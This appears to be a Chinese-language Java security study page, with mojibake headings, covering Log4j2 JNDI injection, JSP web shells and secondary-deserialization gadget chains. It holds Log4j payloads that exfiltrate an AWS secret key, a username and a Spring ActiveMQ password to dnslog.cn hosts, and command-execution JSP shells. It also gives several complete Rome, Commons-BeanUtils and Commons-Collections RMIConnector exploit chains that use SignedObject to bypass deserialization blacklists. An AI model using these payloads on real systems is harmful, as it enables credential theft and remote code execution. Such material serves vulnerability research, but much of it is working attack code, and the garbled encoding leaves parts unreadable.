<h3 id="è·å–ç‚¹ä¸œè¥¿"><a href="#è·å–ç‚¹ä¸œè¥¿" class="headerlink" title="è·å–ç‚¹ä¸œè¥¿"></a>è·å–ç‚¹ä¸œè¥¿</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">è·å–ä¸€äº›äº‘ä¸»æœºçš„ Key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logg.error(&quot;$&#123;jndi:ldap://$&#123;env:AWS_SECRET_ACCESS_KEY&#125;.d0j226.dnslog.cn&#125;&quot;)</span><br><span class="line"></span><br><span class="line">å¯é€šè¿‡ env æ¥è·å–ç¯å¢ƒå˜é‡ä¸­çš„ä¸€äº›ä¿¡æ¯</span><br><span class="line">logg.error(&quot;$&#123;jndi:ldap://$&#123;env:USER&#125;.d0j226.dnslog.cn&#125;&quot;)</span><br><span class="line"></span><br><span class="line">logg.error(&quot;$&#123;jndi:ldap://$&#123;java:version&#125;.u2xf5m.dnslog.cn&#125;&quot;);</span><br><span class="line"></span><br><span class="line">å¤–å¸¦å¯†ç </span><br><span class="line">$&#123;jndi:ldap://$&#123;bundle:application:spring.activemq.password&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Log4j2-2-15-0-æ¼æ´ä¿®å¤ä¸ç»•è¿‡"><a href="#Log4j2-2-15-0-æ¼æ´ä¿®å¤ä¸ç»•è¿‡" class="headerlink" title="Log4j2 2.15.0 æ¼æ´ä¿®å¤ä¸ç»•è¿‡"></a>Log4j2 2.15.0 æ¼æ´ä¿®å¤ä¸ç»•è¿‡</h3><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><h1 id="å†…å­˜ç "><a href="#å†…å­˜ç " class="headerlink" title="å†…å­˜ç "></a>å†…å­˜ç </h1><h2 id="åŸºç¡€-1"><a href="#åŸºç¡€-1" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>Apache æ˜¯ Web æœåŠ¡å™¨ï¼ˆé™æ€è§£æï¼Œå¦‚ HTMLï¼‰ï¼ŒTomcat æ˜¯ java åº”ç”¨æœåŠ¡å™¨ï¼ˆåŠ¨æ€è§£æï¼Œå¦‚ JSPï¼‰</p>
<p>Tomcat åªæ˜¯ä¸€ä¸ª servlet (jsp ä¹Ÿç¿»è¯‘æˆ servlet)å®¹å™¨ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ Apache çš„æ‰©å±•ï¼Œä½†æ˜¯å¯ä»¥ç‹¬ç«‹äº Apache è¿è¡Œã€‚</p>
<ul>
<li>ä¸€å¥è¯æ¦‚æ‹¬ä¸€ä¸‹ï¼Œå°±æ˜¯ Web æœåŠ¡å™¨ï¼Œæ¯”è¾ƒä¸ç¨³å®šï¼Œä½†æ˜¯ä¸šåŠ¡èƒ½åŠ›æ¯”è¾ƒå¼ºã€‚</li>
</ul>
<h2 id="ç "><a href="#ç " class="headerlink" title="ç "></a>ç </h2><h3 id="ä¼ ç»Ÿç "><a href="#ä¼ ç»Ÿç " class="headerlink" title="ä¼ ç»Ÿç "></a>ä¼ ç»Ÿç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line"></span><br><span class="line">	Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="å›æ˜¾ç "><a href="#å›æ˜¾ç " class="headerlink" title="å›æ˜¾ç "></a>å›æ˜¾ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.print(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="filterç "><a href="#filterç " class="headerlink" title="filterç "></a>filterç </h2><h1 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h1><p>å¯¹äº rome æ¥è¯´ï¼ŒäºŒæ¬¡ååºåˆ—åŒ–å¤šç”¨äºç›®æ ‡ä¸å‡ºç½‘çš„æƒ…å†µï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºç»•è¿‡é»‘åå•ï¼‰</p>
<p>è€Œ CB è¿™æ¡ï¼Œå”¯ä¸€ä½œç”¨å°±æ˜¯ç»•è¿‡é»‘åå•äº†å§</p>
<p>å‚è€ƒ</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://zjackky.github.io/post/java-security-talking-for-secondary-desequentization-z1daqqv.html#Jackson%E9%93%BE">https://zjackky.github.io/post/java-security-talking-for-secondary-desequentization-z1daqqv.html#Jackson%E9%93%BE</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15977">https://xz.aliyun.com/news/15977</a></li>
<li><a target="_blank" rel="noopener" href="https://zixyd.github.io/2024/03/21/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Rome">https://zixyd.github.io/2024/03/21/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Rome</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1701/#toc_signedobject">https://tttang.com/archive/1701/#toc_signedobject</a></li>
</ol>
<h2 id="è·¯çº¿"><a href="#è·¯çº¿" class="headerlink" title="è·¯çº¿"></a>è·¯çº¿</h2><ol>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaorenyusi/p/18396846">å¯è’™</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1701/">æ ¸å¿ƒï¼Œæˆ‘ç”¨çš„æ¨¡æ¿|hashmap&#x2F;hashtable</a></li>
<li></li>
</ol>
<h2 id="æ ¸å¿ƒ"><a href="#æ ¸å¿ƒ" class="headerlink" title="æ ¸å¿ƒ"></a>æ ¸å¿ƒ</h2><p><code>SignedObject</code>åŒ…å«å¦ä¸€ä¸ª<code>Serializable</code>å¯¹è±¡ã€‚</p>
<ol>
<li>è°ƒç”¨å®ƒçš„<code>getObject()</code>æ–¹æ³•</li>
</ol>
<h2 id="signedObject"><a href="#signedObject" class="headerlink" title="signedObject"></a>signedObject</h2><h3 id="å¼•ç”¨1rome"><a href="#å¼•ç”¨1rome" class="headerlink" title="å¼•ç”¨1rome"></a>å¼•ç”¨1rome</h3><h3 id="ä¸€tostring"><a href="#ä¸€tostring" class="headerlink" title="ä¸€tostring"></a>ä¸€tostring</h3><p>rome çš„<code>ToStringBean</code>çš„<code>toString()</code>æ–¹æ³•å¯ä»¥åŠåˆ°è°ƒç”¨ getter æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line">public class R2_toString &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Hashtable table1 = getPayload(Templates.class, obj);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        Hashtable table2 = getPayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        run(table2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception&#123;</span><br><span class="line">//        ObjectBean objectBean = new ObjectBean(ToStringBean.class, new ToStringBean(clazz, payloadObj));</span><br><span class="line">//        HashMap hashMap = new HashMap();</span><br><span class="line">//        hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">//        return hashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //EqualsBean bean = new EqualsBean(String.class, &quot;r&quot;);</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(ToStringBean.class, new ToStringBean(clazz, payloadObj));</span><br><span class="line">        HashMap map1 = new HashMap();</span><br><span class="line">        HashMap map2 = new HashMap();</span><br><span class="line">        map1.put(&quot;yy&quot;, objectBean);</span><br><span class="line">        map1.put(&quot;zZ&quot;, payloadObj);</span><br><span class="line">        map2.put(&quot;zZ&quot;, objectBean);</span><br><span class="line">        map2.put(&quot;yy&quot;, payloadObj);</span><br><span class="line">        Hashtable table = new Hashtable();</span><br><span class="line">        table.put(map1, &quot;1&quot;);</span><br><span class="line">        table.put(map2, &quot;2&quot;);</span><br><span class="line">        setFieldValue(objectBean, &quot;_beanClass&quot;, clazz);</span><br><span class="line">        setFieldValue(objectBean, &quot;_obj&quot;, payloadObj);</span><br><span class="line">        return table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="äºŒequal"><a href="#äºŒequal" class="headerlink" title="äºŒequal"></a>äºŒequal</h3><p>ObjectBean#equals ()ï¼Œ</p>
<p>è½¬æŠ˜ç‚¹åœ¨äº<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>ï¼Œ<code>EqualsBean</code>ä¹Ÿå­˜åœ¨è¿™ä¸ªå…³é”®ä»£ç </p>
<p>åˆ©ç”¨<code>Hashtable</code>æ¥è§¦å‘<code>equals</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line">public class R_SignedObject &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Hashtable table1 = getPayload(Templates.class, obj);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        Hashtable table2 = getPayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        run(table2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception&#123;</span><br><span class="line">        EqualsBean bean = new EqualsBean(String.class, &quot;r&quot;);</span><br><span class="line">        HashMap map1 = new HashMap();</span><br><span class="line">        HashMap map2 = new HashMap();</span><br><span class="line">        map1.put(&quot;yy&quot;, bean);</span><br><span class="line">        map1.put(&quot;zZ&quot;, payloadObj);</span><br><span class="line">        map2.put(&quot;zZ&quot;, bean);</span><br><span class="line">        map2.put(&quot;yy&quot;, payloadObj);</span><br><span class="line">        Hashtable table = new Hashtable();</span><br><span class="line">        table.put(map1, &quot;1&quot;);</span><br><span class="line">        table.put(map2, &quot;2&quot;);</span><br><span class="line">        setFieldValue(bean, &quot;_beanClass&quot;, clazz);</span><br><span class="line">        setFieldValue(bean, &quot;_obj&quot;, payloadObj);</span><br><span class="line">        return table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä¸‰ObjectBean"><a href="#ä¸‰ObjectBean" class="headerlink" title="ä¸‰ObjectBean"></a>ä¸‰ObjectBean</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line">public class R_test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        HashMap hashMap1 = getpayload(Templates.class, obj);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        HashMap hashMap2 = getpayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        run(hashMap2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static HashMap getpayload(Class clazz, Object obj) throws Exception &#123;</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">        ObjectBean expObjectBean = new ObjectBean(clazz, obj);</span><br><span class="line">        setFieldValue(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line">        return hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="å¼•ç”¨2cb"><a href="#å¼•ç”¨2cb" class="headerlink" title="å¼•ç”¨2cb"></a>å¼•ç”¨2cb</h3><p>Commons-BeanUtils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• <code>PropertyUtils.getProperty</code> ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter æ–¹æ³•ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import java.security.KeyPair;</span><br><span class="line">import java.security.KeyPairGenerator;</span><br><span class="line">import java.security.Signature;</span><br><span class="line">import java.security.SignedObject;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line">public class CB_SingedfObject &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue1 = getpayload(obj, &quot;outputProperties&quot;);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue2 = getpayload(signedObject, &quot;object&quot;);</span><br><span class="line"></span><br><span class="line">        run(queue2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static PriorityQueue&lt;Object&gt; getpayload(Object object, String string) throws Exception &#123;</span><br><span class="line">        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);</span><br><span class="line">        priorityQueue.add(&quot;1&quot;);</span><br><span class="line">        priorityQueue.add(&quot;2&quot;);</span><br><span class="line">        setFieldValue(beanComparator, &quot;property&quot;, string);</span><br><span class="line">        setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]&#123;object, null&#125;);</span><br><span class="line">        return priorityQueue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é«˜ç‰ˆæœ¬fastjsonï¼Œ"><a href="#é«˜ç‰ˆæœ¬fastjsonï¼Œ" class="headerlink" title="é«˜ç‰ˆæœ¬fastjsonï¼Œ"></a>é«˜ç‰ˆæœ¬fastjsonï¼Œ</h3><p>å…·ä½“çš„çœ‹åšé¢˜çš„ï¼Œvnctf2025</p>
<p>ç”¨äºfastjsonï¼Œè°ƒç”¨åªä¾èµ–äº<code>FastJson</code>çš„åŒ…çš„<code>gadget</code></p>
<p>è€Œæ­£å¥½<code>JsonObject#toString</code>å¯ä»¥è§¦å‘ä»»æ„<code>getter</code>æ–¹æ³•ï¼Œ</p>
<p>è€Œ<code>toString</code>åˆå¯ä»¥é€šè¿‡</p>
<h4 id="ä¸€BadAttributeValueExpException-readObject"><a href="#ä¸€BadAttributeValueExpException-readObject" class="headerlink" title="ä¸€BadAttributeValueExpException#readObject"></a>ä¸€BadAttributeValueExpException#readObject</h4><p>è°ƒç”¨ï¼Œå› æ­¤æ•´æ¡é“¾å­å°±é€šäº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="äºŒHotSwappableTargetSource"><a href="#äºŒHotSwappableTargetSource" class="headerlink" title="äºŒHotSwappableTargetSource"></a>äºŒHotSwappableTargetSource</h4><p>é€šè¿‡equalè§¦å‘tostring</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject -&gt; HotSwappableTargetSource#equals -&gt; XString#equals -&gt; toString</span><br></pre></td></tr></table></figure>

<p>otSwappableTargetSource æ˜¯åœ¨ Spring AOP ä¸­å‡ºç°çš„ä¸€ä¸ªç±»æ˜¯spring åŸç”Ÿçš„ toString åˆ©ç”¨é“¾ã€‚</p>
<p>ä¾èµ–æ¡ä»¶ â— jackson-databindã€spring-aop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><p><strong>æœ‰é»‘åå•çš„æ—¶å€™å¾ˆé¸¡è‚‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import javax.management.remote.JMXServiceURL;</span><br><span class="line">import javax.management.remote.rmi.RMIConnector;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line">public class CC_RMIConnector &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);</span><br><span class="line">        setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/base64string&quot;);</span><br><span class="line">        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, &quot;Poria&quot;);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap,&quot;factory&quot;, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        run(expMap, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

